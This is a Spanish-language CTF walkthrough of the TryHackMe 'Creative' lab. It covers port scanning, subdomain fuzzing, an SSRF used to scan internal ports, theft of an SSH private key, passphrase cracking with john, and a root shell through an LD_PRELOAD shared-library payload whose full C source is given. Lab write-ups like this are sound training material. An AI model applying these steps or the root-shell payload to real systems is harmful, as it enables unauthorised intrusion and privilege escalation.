---
title: "Creative"
description: "Creative"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/creative

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.39.180
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428180008.png)

## Reconocimiento de servicios

````
nmap -sVC -p22,80 -Pn 10.10.39.180
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428180208.png)

## Añadimos el nombre de domnio al etc/hosts

````
creative.thm 10.10.39.180
````

## Gobuster

````
gobuster dir -u http://creative.thm -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
````

## FFUZ

````
ffuf -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt  -fw 6
````

Encontramos un beta.creative.thm con un SSRF

# Fase de ataque

# SSRF

Podemos hacer request al localhost

1. Capturamos la petición con Burpsuite
1. Lo mandamos al Intruder
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428185523.png)
1. Creamos un puertos.txt con todos los puertos para hacer descubrimiento de puertos interno

````
seq 65535 > ports.txt
````

4. Como la web comprueba si la url esta viva o no poniendo "dead". Metemos una opcion que diga si en la web pone dead
4. Lanzamos el ataque
4. Filtramos por lo que no tengan la palabra dead
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428185823.png)
   Podemos ver el puerto 80 y el 1337

## Directory lisiting

La web es el directorio del sistema

1. Buscamos el home del usuario
1. Sacamos su clave privada
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428190346.png)
   ![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428191046.png)
1. Nos conectamos por SSH

````
ssh saad@10.10.39.180 -i id_rsa 
````

Pide passphrase

## Crack passphrase

1. Convertimos la clave privadaa formato john

````
ssh2john id_rsa > id_rsa.john
````

2. La crackeamos con john

````
john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
````

Found!
3. Nos conectamos por SSH

````
ssh saad@10.10.39.180 -i id_rsa 
````

\[-\] ==pwned!==

# Privilege Escalation

Dentro de .bash_history encontramos la contraseña de saad
![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428192109.png)
Podemos ejecutar el siguiente comando con contraseña para saber que comandos con privilegioss puede utilizar el usuario

````
sudo -l
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020240428192155.png)
Vemos que puede utilizar ping y hay una variable LD_PRELOAD

## LD_PRELOAD

1. Creamos un programa en C en /tmp que lanza una terminal root

````
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
````

2. Compilamos

````
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
````

Se crea un archivo shell.so
3. Ejecutamos el shell con el comando con privilegios

````
sudo LD_PRELOAD=/tmp/shell.so find
````

\[+\] ==pwned!==
